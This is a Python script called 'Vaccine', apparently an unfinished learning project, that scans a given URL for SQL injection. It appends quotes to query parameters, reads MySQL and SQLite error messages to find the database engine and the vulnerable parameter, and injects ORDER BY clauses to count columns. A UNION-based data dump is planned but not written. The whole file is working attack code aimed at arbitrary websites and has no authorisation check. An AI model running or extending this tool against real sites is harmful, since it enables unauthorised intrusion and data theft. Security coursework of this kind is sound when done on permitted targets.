#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def args_manager():
    parser = argparse.ArgumentParser(description="Vaccine")
    parser.add_argument(
        "url",
        help="Provide an url to attack"
    )
    parser.add_argument(
        "-o", "--output",
        type=str,
        default="report.txt",
        help="Archive file, if not specified it will be stored in a default one"
    )
    parser.add_argument(
        "-X", "--execute",
        type=str,
        default="GET",
        choices=["GET", "POST"],
        help="Type of request, if not specified GET will be used. [GET or POST] only accepted."
    )
    args = parser.parse_args()
    return(args)

class Vaccine():
    def __init__(self, args):
        self.url = args.url
        self.method = args.execute
        self.output = args.output
        self.session = requests.Session()
        self.db_engine = None
        self.vulnerability_param = None
        print("Initalise the program")

    def find_columns_count(self):
        params = self.get_params()
        for i in range(1, 50):
            test_param = params.copy()
            test_param[self.vulnerable_param] = f"{params[self.vulnerable_param]} ORDER BY {i}--"
            resp = self.run_request(test_param)
            if("Unknown column" in resp.text or "order by" in resp.text.lower()):
                print(f"[+] Nombre de colonnes trouvé : {i-1}")
                return (i - 1)
        return(0) 


    def get_params(self):
        parsed = urlparse(self.url)
        result = {}
        for k, v in parse_qs(parsed.query).items():
            result[k] = v[0]
        return(result)
    
    def run_request(self, params):
        if(self.method == "GET"):
            return(self.session.get(self.url, params=params))
        else:
            return(self.session.post(self.url, data=params))
        
    def detect_engine(self):
        params = self.get_params()
        errors = {
            "MySQL": ["SQL syntax", "mysql_fetch_array", "MySQL Error"],
            "SQLite": ["unrecognized token", "sqlite3", "SQLite3::prepare"]
        }
        for p_name in params:
            test_params = params.copy()
            test_params[p_name] += "'"
            
            resp = self.run_request(test_params)

            for engine, signature in errors.items():
                if any(sig.lower() in resp.text.lower() for sig in signature):
                    self.db_engine = engine
                    self.vulnerable_param = p_name
                    print(f"[+] Found {engine} vulnerability on parameter: {p_name}")
                    return True
        return False

    def make_request(self, url, method="GET", data=None):
        if(method.upper() == "GET"):
            return( self.session.get(url, params=data))
        elif(method.upper() == "POST"):
            return( self.session.post(url, data=data))
 
    def scan(self):
        # 1. Détecter le moteur et le paramètre vulnérable
        if self.detect_engine():
            print(f"[!] Cible vulnérable ({self.db_engine}) sur '{self.vulnerable_param}'")
            
            # 2. Trouver le nombre de colonnes
            col_count = self.find_columns_count()
            
            if col_count > 0:
                # 3. Étape suivante : Le DUMP (Union Select)
                # On verra ça juste après
                pass
        else:
            print("[-] Aucune vulnérabilité détectée.")



def main():
    args = args_manager()
    vaccine = Vaccine(args)
    vaccine.scan()

if(__name__ == "__main__"):
    main()